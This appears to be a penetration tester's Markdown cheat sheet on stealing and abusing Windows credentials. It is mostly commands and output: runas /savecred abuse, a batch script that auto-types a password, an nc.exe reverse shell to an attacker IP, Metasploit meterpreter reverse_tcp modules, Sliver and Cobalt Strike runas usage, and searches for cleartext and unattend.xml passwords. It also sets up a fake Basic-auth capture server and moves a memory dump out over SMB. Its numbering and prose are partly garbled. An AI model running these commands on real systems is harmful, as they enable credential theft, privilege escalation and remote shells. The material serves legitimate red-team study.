# Passwords

## 01 - Registry

Part of the registry configuration is that most Windows operating systems (except Enterprise) were setup specifically to home users sometimes that when they run something that might need to ask the user to give privileges to install applications or changing settings one their computers. Then this is most possibly related to Auto Login settings that is enabled.

Move on to the [[Manual Credential Access]] that this method is related to Autologon settings won't work so instead go to the **Auditing Tools** related for Windows that those helpful scripts will fetch you the credentials you're looking or other interesting files that might be a factor.

## 02 - RunAs

### 2.1 - Manual

#### 2.1.1 - Saved Credentials

##### 2.1.1.1 - Command Prompt

- This privilege escalation techniques is really easy to escalate to get the administrators group level. As the command follows:

```
C:\> cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin

C:\> dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\

C:\> dir C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
```

We know the user is `admin` and the type of password is **Domain Password**. We will use the `runas` windows command to execute with admin privileges. And the flag `/savecred` will store the credentials in the **Windows Credentials** management and can be elevated without needing to re-enter the password after passing the particular username account once.

`C:\> runas /savecred /user:admin shell.exe`

- The full path of the runas.exe Windows builtin tool

`C:\Windows\system32\runas.exe /user:<DOMAIN_NAME>\<username> "C:\Windows\system32\cmd.exe /c whoami"`

We can also leverage this to make it persistent with the credentials we've obtained from the target with this script:

`$ cat savecred.bat`

---

```
@if (@CodeSection == @Batch) @then
@echo off
start "" runas /savecred /user:%1 %2
CScript //nologo //E:JScript "%~F0"
goto :EOF
@end
WScript.CreateObject("WScript.Shell").SendKeys("<password>{ENTER}");
```

The syntax is for the batch script:

`C:\> savecred.bat <path_to_shell>`

- **Start a shell handler to listen for incoming connection.**

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.174.46.
Ncat: Connection from 10.10.174.46:49801.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
```

- **And you have successfully escalated to administrator user account.**

```
C:\Windows\system32> whoami
win-qba94kb3iof\admin
C:\Windows\system32> net user %username%
net user %username%
User name                    admin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/19/2020 10:05:42 AM
Password expires             Never
Password changeable          8/19/2020 10:05:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2022 6:30:17 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

Now let's say you have activated a keylogger to monitor the user's keyboard activities and you have got the credentials. Now you want to use credentials as an Administrator or a different user account and it might ask you a password prompt to do so since it was configured without the autologin that was modified in the registry editor.

`C:\> cmd /c <password> | runas /profile /user:<DOMAIN_NAME>\<username> cmd.exe`

- Using `/netonly` flag via `runas.exe` is only for lateral movement.

##### 2.1.1.2 - Powershell

```
PS C:\> cmdkey /list

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

- Another method is using powershell to supply with the defined variables and execute with a powershell cmdlet `Start-Process`.

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
start-process -filepath <path_to_shell> -NoNewWindow -Credential $credential -WorkingDirectory c:\Users\Public
```

- If you have `netcat` or other malware you want to execute that might contain arguments.

```powershell
PS C:\> Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("<attacker_IP>","<attacker_PORT>","-e","cmd.exe") -WorkingDirectory C:\Users\Public
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $creds.Username, $creds.Password, $computer)
```

- Syntax using the `Start-Process`:

```
PS C:\> Start-Process <commands> -ArgumentList (<arg1>,<arg2, ...) -verb RunAs

PS C:\> start-process cmd -argumentlist ("/c", "echo", "yes") -verb runas
```

- Using the `-NoNewWindow` flag that some programs may open it with a window pop up.

`PS C:\> start-process cmd -NoNewWindow -argumentlist ("/c", "echo", "yes") -verb runas`

- Or you can remotely authenticate a network shared workstation to interact even further when you need to

```
PS C:\> invoke-command -computer <IP> -credential $credential -scriptblock { <commands> }

PS C:\> Enter-PSSession -ComputerName <IP>
```

### 2.2 - Metasploit

- **MSF Windows 'Run As' Using Powershell Post Module**

```
msf > use post/windows/manage/run_as_psh

msf post(windows/manage/run_as_psh) > options

Module options (post/windows/manage/run_as_psh):  
  
  Name         Current Setting  Required  Description  
  ----         ---------------  --------  -----------  
  ARGS                          no        Arguments  
  CHANNELIZE   true             yes       Channelize output, required for reading output or interacting  
  DOMAIN                        no        Domain of user  
  EXE          cmd.exe          yes       Executable to run  
  HIDDEN       true             yes       Hide the window  
  INTERACTIVE  true             yes       Run interactively  
  PASS                          yes       Password of user  
  PATH         C:\              yes       Working Directory  
  SESSION                       yes       The session to run this module on  
  USER                          yes       User to run executable as  
  
  
View the full module info with the info, or info -d command.

msf post(windows/manage/run_as_psh) > set channelize <true | false>

msf post(windows/manage/run_as_psh) > set exe /path/to/malware.exe

msf post(windows/manage/run_as_psh) > set args [arguments]

msf post(windows/manage/run_as_psh) > set hidden <true | false>

msf post(windows/manage/run_as_psh) > set interactive <true | false>

msf post(windows/manage/run_as_psh) > set user <username>

msf post(windows/manage/run_as_psh) > set pass <password>

msf post(windows/manage/run_as_psh) > set domain [domain_name]

msf post(windows/manage/run_as_psh) > set path <C:\\path\\to\\directory>

msf post(windows/manage/run_as_psh) > set session <session_id>

msf post(windows/manage/run_as_psh) > run
```

- **MSF Windows Manage Run Command As User Post Module**

```
msf > use post/windows/manage/run_as

msf post(windows/manage/run_as) > options

Module options (post/windows/manage/run_as):  
  
  Name      Current Setting  Required  Description  
  ----      ---------------  --------  -----------  
  CMD                        yes       Command to execute  
  CMDOUT    false            yes       Retrieve command output  
  DOMAIN                     yes       Domain to login with  
  PASSWORD                   yes       Password to login with  
  SESSION                    yes       The session to run this module on  
  USER                       yes       Username to login with  
  
  
View the full module info with the info, or info -d command.

msf post(windows/manage/run_as) > set cmdout <true | false>

msf post(windows/manage/run_as) > set cmd <commands> [arguments]

msf post(windows/manage/run_as) > set user <username>

msf post(windows/manage/run_as) > set password <password>

msf post(windows/manage/run_as) > set domain <domain_name>

msf post(windows/manage/run_as) > set session <session_id>

msf post(windows/manage/run_as) > run
```

- **MSF Windows Run Command As User Exploit Module**

```
msf > use exploit/windows/local/run_as

msf exploit(windows/local/run_as) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/run_as) > options

Module options (exploit/windows/local/run_as):

  Name                Current Setting  Required  Description
  ----                ---------------  --------  -----------
  APPLICATION_NAME                     no        Application to be executed (lpApplicationName)
  COMMAND_LINE                         no        Command line to execute (lpCommandLine)
  DOMAIN                               no        Domain to login with
  PASSWORD                             yes       Password to login with
  SESSION                              yes       The session to run this module on
  USER                                 yes       Username to login with
  USE_CUSTOM_COMMAND  false            yes       Specify custom APPLICATION_NAME and COMMAND_LINE


Payload options (windows/x64/meterpreter/reverse_tcp):

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
  LHOST                      yes       The listen address (an interface may be specified)
  LPORT     4444             yes       The listen port
  
  
Exploit target:  
  
  Id  Name  
  --  ----  
  0   Automatic  
  
  
  
View the full module info with the info, or info -d command.  

msf exploit(windows/local/run_as) > set use_custom_command <true | false>

msf exploit(windows/local/run_as) > set application_name [C:\\path\\to\\program.exe]

msf exploit(windows/local/run_as) > set command_line [arguments]

msf exploit(windows/local/run_as) > set user <username>

msf exploit(windows/local/run_as) > set pass <password>

msf exploit(windows/local/run_as) > set domain [domain_name]

msf exploit(windows/local/run_as) > set lhost <IP>

msf exploit(windows/local/run_as) > set lport <PORT>

msf exploit(windows/local/run_as) > set exitfunc <seh | thread | process | none>

msf exploit(windows/local/run_as) > run
```

- **MSF Windows Escalate UAC Execute RunAs Exploit Module**

```
msf > use exploit/windows/local/ask

msf exploit(windows/local/ask) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/ask) > options 

Module options (exploit/windows/local/ask):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILENAME                    no        File name on disk
   PATH                        no        Location on disk, %TEMP% used if not set
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/local/ask) > set technique <EXE | PSH>

msf exploit(windows/local/ask) > set path [C:\\path\\to\\file.<exe | ps1>]

msf exploit(windows/local/ask) > set lhost <IP>

msf exploit(windows/local/ask) > set lport <PORT>

msf exploit(windows/local/ask) > set exitfunc <seh | thread | process | none>

msf exploit(windows/local/ask) > set session <session_id>

msf exploit(windows/local/ask) > run -j
```

### 2.3 - Sliver

#### 2.3.1 - Help Menu

```
sliver (IMPLANT_NAME) > runas -h

Command: runas [--username] [--process] [--args]
About: (Windows Only) Run a new process in the context of the designated user

Usage:
======
  runas [flags]

Flags:
======
  -a, --args        string    arguments for the process
  -d, --domain      string    domain of the user
  -h, --help                  display help
  -n, --net-only              use
  -P, --password    string    password of the user
  -p, --process     string    process to start
  -s, --show-window           Log on, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials.
  -t, --timeout     int       command timeout in seconds (default: 30)
  -u, --username    string    user to impersonate
```

#### 2.3.2 - Usage

### 2.3 - Cobalt Strike

TODO: Provide examples with these

`beacon> runas <domain_name>\<username> <password> <command> [arguments]`

`beacon> runu`

## 03 - Security Account Manager (SAM)

Move on to the [[Manual Credential Access]] to that is related to windows yet this method related to Autologin settings won't work so instead go to the **Auditing Tools** related for Windows that those helpful scripts will fetch you the credentials you're looking or other interesting files that might be a factor.

## 04 - Sensitive Files

### 4.1 - Clear Text Passwords

#### 4.1.1 - Command Prompt

- Search for Cleartext Passwords

```
C:\> findstr /si password *.txt

C:\> findstr /si password *.xml

C:\> findstr /si password *.ini
```

- Find all those strings in config files

```
C:\> findstr /si password *.txt

C:\> findstr /b /s unattend.xml

C:\> dir /s *pass* == *cred* == *vnc* == *.config* 2>nul

C:\> dir /s /b *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* 2>nul

C:\> dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

C:\> where /r C:\ user.txt

C:\> where /r C:\ *.ini

C:\> wmic datafile where "drive='C:' AND name like '%password%'" get name,readable,size /value
```

- Find all passwords in all files

`C:\> findstr /spin "password" *.*`

#### 4.1.2 - Powershell

- Search for Cleartext Passwords

`PS C:\> Get-ChildItem -Recurse -Path C:\ | ? {$_.Name -eq "*.txt" -or $_.Name -eq "*.pdf" -or $_.Name -eq "*.ini"}`

- Find all those strings in config files

```
PS C:\> Get-Childitem -Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue

PS C:\> Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" or $_.Name -like "*.ini")}
```

#### 4.1.3 - Metasploit

- **MSF Windows Gather Generic File Collection Post Module**

```
msf > use post/windows/gather/enum_files

msf post(windows/gather/enum_files) > options

Module options (post/windows/gather/enum_files):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_GLOBS   *.config         yes       The file pattern to search for in a filename
   SEARCH_FROM                   no        Search from a specific location. Ex. C:\
   SESSION                       yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(windows/gather/enum_files) > set file_globs *.txt or *.xml or *.ini

msf post(windows/gather/enum_files) > set search_from <C:\\path\\to\\directory>

msf post(windows/gather/enum_files) > set session <session_id>

msf post(windows/gather/enum_files) > run
```

- **MSF Parser Windows Unattend Passwords Auxiliary Module**

```
msf > use auxiliary/parser/unattend

msf auxiliary(parser/unattend) > options

Module options (auxiliary/parser/unattend):

   Name       Current Setting  Required  Description 
   ----       ---------------  --------  ----------- 
   PATH                        yes       Directory or file to parse. 
   RECURSIVE  false            yes       Recursively check for files

msf auxiliary(parser/unattend) > set path /path/to/file(s)

msf auxiliary(parser/unattend) > set recursive <true | false>

msf auxiliary(parser/unattend) > run
```

### 4.2 - Group Policy Preferences

#### 4.2.1 - Powersploit

```
PS C:\> ipmo .\PowerUp.ps1

PS C:\> Get-CachedGPPPassword

PS C:\> Get-GPPPassword
```

#### 4.2.2 - Metasploit

- **MSF Windows Gather Unattended Answer File Enumeration Post Module**

```
msf > use post/windows/gather/enum_unattend

msf post(windows/gather/enum_unattend) > options

Module options (post/windows/gather/enum_unattend):

   Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   GETALL   true             yes       Collect all unattend.xml that are found
   SESSION                   yes       The session to run this module on

msf post(windows/gather/enum_unattend) > set getall <true | false>

msf post(windows/gather/enum_unattend) > set session <sessions_id>

msf post(windows/gather/enum_unattend) > run
```

- When we run the module we gathered the credentials.

```
meterpreter > run post/windows/gather/enum_unattend

[*] Reading C:\Windows\panther\unattend.xml
[+] Raw version of C:\Windows\panther\unattend.xml saved as: /root/.msf4/loot/20220529162508_default_10.10.229.49_windows.unattend_364476.txt
Unattend Credentials
====================

 Type  Domain  Username  Password     Groups
 ----  ------  --------  --------     ------
 auto          Admin     password123

[+] Unattend Credentials saved as: /root/.msf4/loot/20220529162508_default_10.10.229.49_windows.unattend_378467.txt
```

## 03 - Memory

### 3.1 - Metasploit

#### 3.1.1 - Usage

- **MSF HTTP Client Basic Authentication Credential Collector Auxiliary Module**

```
msf > use auxiliary/server/capture/http_basic

msf auxiliary(server/capture/http_basic) > options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                       no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server


msf auxiliary(server/capture/http_basic) > set uripath [/uri_path]

msf auxiliary(server/capture/http_basic) > set srvhost <IP>

msf auxiliary(server/capture/http_basic) > set srvport <PORT>

msf auxiliary(server/capture/http_basic) > set ssl <true | false>

msf auxiliary(server/capture/http_basic) > set sslcert </path/to/cert.pem>

msf auxiliary(server/capture/http_basic) > set realm <realm_name>

msf auxiliary(server/capture/http_basic) > set redirectURL <url>

msf auxiliary(server/capture/http_basic) > run
```

#### 3.1.2 - Use Case

```
msf6 > use auxiliary/server/capture/http_basic

msf6 auxiliary(server/capture/http_basic) > options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                       no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server


msf6 auxiliary(server/capture/http_basic) > set srvhost 10.8.145.108
srvhost => 10.8.145.108
msf6 auxiliary(server/capture/http_basic) > set uripath /login
uripath => /login
msf6 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 3.
[*] Using URL: http://10.8.145.108/login
[*] Server started.
```

![[01 - Realm.png]]

![[02 - Create Dump File.png]]

![[03 - Memory Dump File Saved.png]]

```
$ sudo smbserver.py share $(pwd)

C:\Users\user>copy C:\Users\user\AppData\Local\Temp\iexplore.dmp \\10.8.145.108\share\
The specified network name is no longer available.
        1 file(s) copied.

$ ls -lh
total 100M
-rw-r--r-- 1 user user 100M May 29 16:41 iexplore.dmp

$ strings iexplore.DMP | grep "Authorization: Basic"

$ echo -ne <base64_string> | base64 -d
```

## References

- [SS64 RunAs](https://ss64.com/nt/runas.html)

- [Windows Server 2012 R2](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))

- [Windows RunAs Command Prompt](https://www.windows-commandline.com/windows-runas-command-prompt/)

- [RunAs Reverse Shell](https://gist.github.com/int0x33/eb358632a13bcd1e017a14c0fb00a52b)

- [Windows RunAs Reverse Shell](https://labs.p64cyber.com/windows-run-as-reverse-shell/)